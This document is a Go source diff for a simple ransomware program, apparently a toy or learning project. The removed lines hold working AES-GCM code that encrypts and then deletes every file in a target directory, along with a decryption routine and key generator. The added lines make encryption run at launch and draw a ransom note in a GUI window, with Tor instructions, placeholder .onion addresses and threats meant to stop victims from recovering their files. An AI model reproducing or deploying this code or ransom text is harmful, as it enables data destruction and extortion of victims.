@@ -1,156 +1,63 @@
 package main
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
-	"crypto/rand"
-	"flag"
-	"fmt"
-	"io"
-	"math/big"
-	"os"
-	"path/filepath"
+	gui "github.com/gen2brain/raylib-go/raygui"
+	rl "github.com/gen2brain/raylib-go/raylib"
+	"golang.design/x/clipboard"
 )
 
 func main() {
-	enc := flag.Bool("e", false, "start encryption")
-	dec := flag.Bool("d", false, "start decryption")
+	rl.SetTraceLogLevel(rl.LogWarning)
+	rl.InitWindow(750, 600, "IMPORTANT")
 
-	flag.Parse()
+	var(
+		textBoxText = ""
+		textBoxEditMode bool = false
+	)
+	key, err := encrypt()
+	if err != nil { panic(err) }
 
-	fmt.Println("RANSOM")
+	rl.SetTargetFPS(60)
 
-	if *enc {
-		err := encrypt()
-		if err != nil {
-			panic(err)
+	for !rl.WindowShouldClose() {
+		rl.BeginDrawing()
+		rl.ClearBackground(rl.RayWhite)
+
+		rl.DrawText("You Have Been a Victim of [Ransomware name]", 25, 25, 25, rl.DarkGray)
+		rl.DrawText("your files are encrypted with RSA-2048 and AES-128 ciphers.", 25, 75, 20, rl.DarkGray)		
+		rl.DrawText("You can only decrypt your files with the specific key we have.", 25, 105, 20, rl.DarkGray)		
+		rl.DrawText("What to do:", 25, 155, 20, rl.DarkGray)
+		rl.DrawText("1. Go to https://www.torproject.org/ and download the Tor Browser", 25, 185, 20, rl.DarkGray)
+		rl.DrawText("2. Visit one of these pages:", 25, 215, 20, rl.DarkGray)
+		rl.DrawText("[mirror1].onion", 50, 245, 20, rl.DarkGray)
+		rl.DrawText("[mirror2].onion", 50, 275, 20, rl.DarkGray)
+		rl.DrawText("WARNING!", 25, 325, 25, rl.DarkGray)
+		rl.DrawText("1. Renaming, copying, deleting or moving any files could DAMAGE ", 25, 355, 20, rl.DarkGray)
+		rl.DrawText("the cipher and decryption will be impossible.", 40, 385, 20, rl.DarkGray)
+		rl.DrawText("2. Trying to recover with any software can also break the cipher", 25, 415, 20, rl.DarkGray)
+		rl.DrawText("and file recovery will become a problem.", 40, 445, 20, rl.DarkGray)
+		rl.DrawText("key: "+key, 40, 485, 20, rl.DarkGray)
+				
+		gui.SetStyle(gui.DEFAULT, gui.TEXT_SIZE, 20)
+
+		gui.SetStyle(gui.TEXTBOX, gui.TEXT_ALIGNMENT, int64(gui.TEXT_ALIGN_LEFT))
+		if gui.TextBox(rl.Rectangle{X: 25, Y: 525, Width: 325, Height: 40}, &textBoxText, 64, textBoxEditMode) {
+			textBoxEditMode = !textBoxEditMode
 		}
-	} else if *dec {
-		err := decrypt()
-		if err != nil {
-			panic(err)
+
+		if textBoxEditMode && (rl.IsKeyDown(rl.KeyLeftControl) || rl.IsKeyDown(rl.KeyRightControl)) && rl.IsKeyPressed(rl.KeyV) {
+			textBoxText += string(clipboard.Read(clipboard.FmtText))
 		}
-	}
-}
-
-func encrypt() error {
-	fmt.Println("starting encrpytion")
-	key, err := keygen(16)
-	if err != nil {
-		return fmt.Errorf("error generating the key: %s", err.Error())
-	}
-	fmt.Println("aes key:", string(key))
-
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return fmt.Errorf("failed to create AES cipher block: %w", err)
-	}
-
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return fmt.Errorf("failed to create GCM cipher: %w", err)
-	}
-
-	err = filepath.Walk("./targetdir", func(path string, info os.FileInfo, err error) error {
-		if !info.IsDir() && !(path[len(path)-10:] == ".encrypted") {
-			fmt.Println("encrypting", path)
-			plaintext, err := os.ReadFile(path)
-			if err != nil {
-				return fmt.Errorf("failed to read input file: %w", err)
+		
+		gui.SetStyle(gui.BUTTON, gui.TEXT_ALIGNMENT, gui.TEXT_ALIGN_CENTER)
+		if gui.Button(rl.Rectangle{X: 370, Y: 525, Width: 150, Height: 40}, gui.IconText(gui.ICON_KEY, "Decrypt")) {
+			if err := decrypt(textBoxText); err != nil {
+				panic(err)
 			}
-
-			nonce := make([]byte, gcm.NonceSize())
-			if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
-				return fmt.Errorf("failed to generate nonce: %w", err)
-			}
-
-			ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
-
-			err = os.WriteFile(path+".encrypted", ciphertext, 0644)
-			if err != nil {
-				return fmt.Errorf("failed to write output file: %w", err)
-			}
-			os.Remove(path)
-
 		}
-		return nil
-	})
 
-	if err != nil {
-		return err
+		rl.EndDrawing()
 	}
 
-	fmt.Println("encryption successful")
-	return nil
-}
-
-func decrypt() error {
-	fmt.Println("key:")
-	var key string
-	fmt.Scanln(&key)
-
-	fmt.Println("startring decryption")
-
-	block, err := aes.NewCipher([]byte(key))
-	if err != nil {
-		return fmt.Errorf("failed to create AES cipher block: %w", err)
-	}
-
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return fmt.Errorf("failed to create GCM cipher: %w", err)
-	}
-
-	err = filepath.Walk("./targetdir", func(path string, info os.FileInfo, err error) error {
-		if !info.IsDir() {
-			ciphertext, err := os.ReadFile(path)
-			if err != nil {
-				return fmt.Errorf("failed to read input file: %w", err)
-			}
-
-			nonceSize := gcm.NonceSize()
-			if len(ciphertext) < nonceSize {
-				return fmt.Errorf("invalid ciphertext: too short to contain nonce")
-			}
-
-			nonce, actualCiphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
-
-			plaintext, err := gcm.Open(nil, nonce, actualCiphertext, nil)
-			if err != nil {
-				return fmt.Errorf("failed to decrypt/authenticate ciphertext: %w", err)
-			}
-			fmt.Println("decrypting", path)
-
-			err = os.WriteFile(path[:len(path)-10], plaintext, 0644)
-			if err != nil {
-				return fmt.Errorf("failed to write output file: %w", err)
-			}
-
-			os.Remove(path)
-		}
-		return nil
-	})
-
-	if err != nil {
-		return err
-	}
-
-	fmt.Println("decryption successful")
-	return nil
-}
-
-func keygen(maxLength int) ([]byte, error) {
-	possibleCharacters := "abcdefghijklmnopqrstuvwxyz"
-	result := make([]byte, maxLength)
-
-	for i := 0; i < maxLength; i++ {
-		indexBig, err := rand.Int(rand.Reader, big.NewInt(int64(len(possibleCharacters))))
-		if err != nil {
-			return nil, err
-		}
-		index := indexBig.Int64()
-		result[i] = possibleCharacters[index]
-	}
-
-	return result, nil
+	rl.CloseWindow()
 }
